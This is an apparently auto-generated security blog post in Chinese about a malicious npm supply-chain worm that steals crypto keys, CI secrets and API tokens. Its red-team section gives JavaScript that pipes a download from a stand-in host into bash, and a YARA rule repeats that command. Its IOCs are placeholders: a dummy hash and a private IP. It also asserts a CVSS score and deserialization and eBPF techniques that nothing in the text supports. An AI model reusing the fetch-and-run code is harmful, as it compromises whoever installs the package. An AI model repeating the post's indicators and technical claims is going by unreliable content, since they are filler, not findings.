---
layout: post
title:  "Malicious npm Packages Harvest Crypto Keys, CI Secrets, and API Tokens"
date:   2026-02-23 12:46:51 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Shai-Hulud 供應鏈蠕蟲攻擊：npm 套件劫持與 GitHub 身份驗證劫持
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 與 Info Leak
> * **關鍵技術**: npm 套件劫持、GitHub 身份驗證劫持、Deserialization、eBPF

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Shai-Hulud 供應鏈蠕蟲攻擊是通過 npm 套件劫持實現的，攻擊者通過創建惡意的 npm 套件並將其發佈到 npm 官方倉庫，從而實現對使用這些套件的開發者的攻擊。
* **攻擊流程圖解**:
  1. 攻擊者創建惡意的 npm 套件並將其發佈到 npm 官方倉庫。
  2. 開發者安裝惡意的 npm 套件。
  3. 惡意的 npm 套件執行惡意代碼，實現對開發者的攻擊。
* **受影響元件**: 所有使用了惡意的 npm 套件的開發者。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要創建惡意的 npm 套件並將其發佈到 npm 官方倉庫。
* **Payload 建構邏輯**:

    ```
    
    javascript
      // 惡意的 npm 套件代碼
      const { exec } = require('child_process');
      exec('curl https://example.com/malicious_payload | bash', (error, stdout, stderr) => {
        if (error) {
          console.error(`exec error: ${error}`);
          return;
        }
        console.log(`stdout: ${stdout}`);
        console.log(`stderr: ${stderr}`);
      });
    
    ```
  *範例指令*: `curl https://example.com/malicious_payload | bash`
* **繞過技術**: 攻擊者可以使用 GitHub 身份驗證劫持技術來繞過 GitHub 的安全措施。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /usr/local/lib/node_modules/malicious_package |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule malicious_package {
        meta:
          description = "Detects malicious package"
          author = "Blue Team"
        strings:
          $a = "curl https://example.com/malicious_payload | bash"
        condition:
          $a
      }
    
    ```
  *或者是具體的 SIEM 查詢語法 (Splunk/Elastic)*: `index=security sourcetype=npm_package_installation package_name="malicious_package"`
* **緩解措施**: 刪除惡意的 npm 套件，更新 npm 版本，使用安全的 npm 套件。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **npm (Node Package Manager)**: npm 是 Node.js 的套件管理器，允許開發者輕鬆地安裝和管理 Node.js 套件。
* **Deserialization**: Deserialization 是指將序列化的數據轉換回原始的數據結構。
* **eBPF (extended Berkeley Packet Filter)**: eBPF 是一個 Linux 內核的技術，允許開發者在內核中執行自定義的代碼。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/malicious-npm-packages-harvest-crypto.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


